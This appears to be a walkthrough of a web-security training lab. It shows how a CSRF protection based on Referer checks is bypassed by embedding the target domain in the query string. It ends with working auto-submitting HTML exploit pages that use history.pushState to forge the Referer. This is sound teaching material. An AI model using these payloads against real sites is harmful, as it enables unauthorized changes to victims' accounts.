Title: CSRF with broken Referer validation
Level: Practitioner
Desc: This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter

# Walkthrough:
Standard request to change email - look at Referer header being present:
<img width="1029" height="453" alt="image" src="https://github.com/user-attachments/assets/73381657-1905-4c87-a865-2c62d915339d" />

Deleting Referer header is not an option:
<img width="1109" height="468" alt="image" src="https://github.com/user-attachments/assets/b66bf391-0ad1-4f9a-8391-593458073580" />

I changed referer header to something like that: `mydomain.com/?seems_legit=original_domain`. And the validation is built in that way, it accepts any Referer value if we have original site/domain anywhere in value of Referer.
<img width="1041" height="509" alt="image" src="https://github.com/user-attachments/assets/8fcd07c3-4b7f-4132-9da5-84529bb6e87c" />

Now, craft the exploit:
```
<form method="POST" action="https://0a470071042a1314800826bb000100c3.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="tes23@normal-user.net">
</form>
<meta name="referrer" content="unsafe-url">
<script>
    document.forms[0].submit();
</script>
```
But I need to place this script on a domain: 
<img width="1248" height="216" alt="image" src="https://github.com/user-attachments/assets/2ff9fc6e-b91b-46d8-bd01-70e02130576b" />

```
<form method="POST" action="https://0a470071042a1314800826bb000100c3.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="tes223@normal-user.net">
</form>
<meta name="referrer" content="unsafe-url">
<script>
    history.pushState("", "", "/?0a470071042a1314800826bb000100c3.web-security-academy.net");
    document.forms[0].submit();
</script>
```

The most important part here is : `history.pushState("", "", "/?0a470071042a1314800826bb000100c3.web-security-academy.net");`

